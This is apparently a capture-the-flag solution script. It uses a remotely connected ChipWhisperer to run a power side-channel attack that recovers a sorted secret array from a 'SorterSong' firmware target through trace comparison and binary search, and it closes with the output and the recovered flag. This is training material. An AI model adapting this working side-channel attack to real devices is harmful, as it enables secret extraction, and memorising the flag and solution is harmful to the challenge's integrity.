from pathlib import Path
import sys

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM, interact
import numpy as np
import matplotlib.pyplot as plt
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="path/to/your/priv_key", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)


def main():
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())

        # Setting up the scope for capturing
        scope.adc.samples = 1000
        BAUD = target.baud
        CLOCK = scope.io.clkout
        NEWCLOCK = 7.5e6
        scope.io.clkout = NEWCLOCK
        NEWCLOCK = scope.io.clkout
        target.baud = BAUD * NEWCLOCK / CLOCK
        scope.adc.clk_freq = 7500000.0
        print(f"[+] Changed baud rate from {BAUD} to {target.baud}")
        print(f"[+] Changed clkout from {CLOCK} to {NEWCLOCK}")

        # Setup the target for simpleserial
        cw.put_file("sortersSong-{}.hex".format(PLATFORM), "sorterSong-{}.hex".format(PLATFORM))
        cw.program_target(scope, prog, "/home/pi/remote_files/sorterSong-{}.hex".format(PLATFORM))
        print("[+] Programmed target with sorterSong-{}.hex".format(PLATFORM))

        # Attack loop for SorterSong1
        secret_array = []
        # Get reference diff for no sorting
        interact(scope, target, command="p", pass_guess=bytes([2, 0, 0, 0]), bytes_to_read=2)
        reference_trace = obtain(cap_pass_trace(scope, target, b'', command="d", reset=False))
        interact(scope, target, command="p", pass_guess=bytes([2, 1, 0, 0]), bytes_to_read=2)
        reference_trace_2 = obtain(cap_pass_trace(scope, target, b'', command="d", reset=False))
        diff_ref = np.sum(np.abs(reference_trace - reference_trace_2))
        #print(f"Diff for 0 and 1: {diff_ref}")

        # First iteration for byte 0
        min_i = 2
        max_i = 0xffff
        secret_byte = 1
        while min_i <= max_i:
            i = (min_i + max_i) // 2
            interact(scope, target, command="p", pass_guess=bytes([2, i&0xff, i>>8, 0]), bytes_to_read=2)
            trace = obtain(cap_pass_trace(scope, target, b'', command="d", reset=False))
            dft_trace = np.fft.rfft(trace)
            diff = np.abs(trace - reference_trace)
            #print(f"Diff for {i} for position 1: {np.sum(diff)}")
            #plot_traces([reference_trace, trace], filename=f"traces/sort_{i}.png")
            if np.sum(diff) > diff_ref+100:
                max_i = i-1
            else:
                min_i = i+1
                secret_byte = i
        print(f"[+] Found value {secret_byte} for position 1")
        secret_array.append(secret_byte)        

        # Reset array
        interact(scope, target, command="x", pass_guess=b'')
        
        for byte_pos in range(len(secret_array), 15):
            interact(scope, target, command="p", pass_guess=bytes([2, (secret_array[-1]-1)&0xff, (secret_array[-1]-1)>>8, byte_pos]), bytes_to_read=2)
            reference_trace = obtain(cap_pass_trace(scope, target, b'', command="d", reset=False))
            interact(scope, target, command="p", pass_guess=bytes([2, secret_array[-1]&0xff, secret_array[-1]>>8, byte_pos]), bytes_to_read=2)
            reference_trace_2 = obtain(cap_pass_trace(scope, target, b'', command="d", reset=False))
            diff_ref = np.sum(np.abs(reference_trace - reference_trace_2))
            #print(f"Diff for {secret_array[-1]-1} and {secret_array[-1]}: {diff_ref}")

            min_i = secret_array[-1]+1
            max_i = 0xffff
            secret_byte = secret_array[-1]
            while min_i <= max_i:
                i = (min_i + max_i) // 2
                interact(scope, target, command="p", pass_guess=bytes([2, i&0xff, i>>8, byte_pos]), bytes_to_read=2)
                trace = obtain(cap_pass_trace(scope, target, b'', command="d", reset=False))
                diff = np.abs(trace - reference_trace)
                #print(f"Diff for {i} at position {byte_pos+1}: {np.sum(diff)}")
                if np.sum(diff) > diff_ref+100:
                    max_i = i-1
                else:
                    min_i = i+1
                    secret_byte = i
            print(f"[+] Found value {secret_byte} for position {byte_pos+1}")
            secret_array.append(secret_byte)
        
        print("[+] Secret array found: ", secret_array)  
        secret_array_extended = []
        for x in secret_array:
            secret_array_extended.append(x & 0xff)
            secret_array_extended.append((x >> 8) & 0xff)
        flag = interact(scope, target, command="b", pass_guess=bytes(secret_array_extended), bytes_to_read=20)
        print("[+] Flag: ", flag)       
if __name__ == "__main__":
    main()

# [+] Programmed target with sorterSong-CWNANO.hex
# [+] Found value 870 for position 1
# [+] Found value 9354 for position 2
# [+] Found value 16418 for position 3
# [+] Found value 18689 for position 4
# [+] Found value 19425 for position 5
# [+] Found value 26972 for position 6
# [+] Found value 28828 for position 7
# [+] Found value 34697 for position 8
# [+] Found value 36999 for position 9
# [+] Found value 38134 for position 10
# [+] Found value 39538 for position 11
# [+] Found value 42554 for position 12
# [+] Found value 45925 for position 13
# [+] Found value 51478 for position 14
# [+] Found value 54491 for position 15
# [+] Secret array found:  [870, 9354, 16418, 18689, 19425, 26972, 28828, 34697, 36999, 38134, 39538, 42554, 45925, 51478, 54491]
# [+] Flag:  bytearray(b'ss2{!AEGILOPS_chimps')